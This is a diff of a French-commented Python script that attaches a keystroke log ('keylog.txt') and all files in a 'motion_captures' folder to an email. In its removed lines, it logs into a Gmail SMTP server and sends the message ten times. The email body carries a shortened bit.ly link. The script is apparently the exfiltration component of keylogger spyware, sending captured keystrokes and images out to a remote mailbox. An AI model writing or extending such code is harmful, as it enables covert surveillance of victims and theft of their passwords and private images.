@@ -1,4 +1,5 @@
 import smtplib
+import os
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
@@ -20,32 +21,50 @@ msg['Subject'] = "Voici le fichier texte avec les entrées clavier "
 body = "Bonjour,\n\nVoici le fichier texte que vous avez demandé le detail se trouve ici https://bit.ly/4gHmLDP ton retour est import.\n\nCordialement."
 msg.attach(MIMEText(body, 'plain'))
 
+
+
+
+
 # Ajouter une pièce jointe (fichier texte)
-filename = "keylog.txt"  # Nom du fichier à envoyer
+# Liste des fichiers et dossiers à envoyer
+files_to_send = ["keylog.txt"]
+folders_to_send = ["motion_captures"]
 
-try:
-    with open(filename, "rb") as attachment:
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload(attachment.read())
-        encoders.encode_base64(part)
-        part.add_header(
-            'Content-Disposition',
-            f'attachment; filename={filename}',
-        )
-        msg.attach(part)
+# Attacher les fichiers individuels
+for filename in files_to_send:
+    try:
+        with open(filename, "rb") as attachment:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(attachment.read())
+            encoders.encode_base64(part)
+            part.add_header(
+                'Content-Disposition',
+                f'attachment; filename={filename}',
+            )
+            msg.attach(part)
+        print(f"Fichier {filename} attaché avec succès.")
+    except FileNotFoundError:
+        print(f"Erreur : Le fichier {filename} est introuvable.")
+    except Exception as e:
+        print(f"Une erreur s'est produite lors de l'attachement de {filename}: {e}")
 
-    # Connexion au serveur SMTP et envoi de l'email
-    server = smtplib.SMTP(smtp_server, smtp_port)
-    server.starttls()  # Démarrer la connexion sécurisée TLS
-    server.login(username, password)  # Connexion avec les identifiants Gmail
-    for i in range(10):
-        server.send_message(msg)  # Envoi du message
-        print(f"Email {i+1} envoyé avec succès !")
-    server.quit()  # Fermeture de la connexion
-
-    print("Email envoyé avec succès !")
-
-except FileNotFoundError:
-    print(f"Erreur : Le fichier {filename} est introuvable.")
-except Exception as e:
-    print(f"Une erreur s'est produite : {e}")
+# Attacher les fichiers des dossiers
+for folder in folders_to_send:
+    if os.path.exists(folder) and os.path.isdir(folder):
+        for filename in os.listdir(folder):
+            file_path = os.path.join(folder, filename)
+            try:
+                with open(file_path, "rb") as attachment:
+                    part = MIMEBase('application', 'octet-stream')
+                    part.set_payload(attachment.read())
+                    encoders.encode_base64(part)
+                    part.add_header(
+                        'Content-Disposition',
+                        f'attachment; filename={filename}',
+                    )
+                    msg.attach(part)
+                print(f"Fichier {filename} du dossier {folder} attaché avec succès.")
+            except Exception as e:
+                print(f"Une erreur s'est produite lors de l'attachement de {filename} du dossier {folder}: {e}")
+    else:
+        print(f"Erreur : Le dossier {folder} est introuvable ou n'est pas un dossier.")
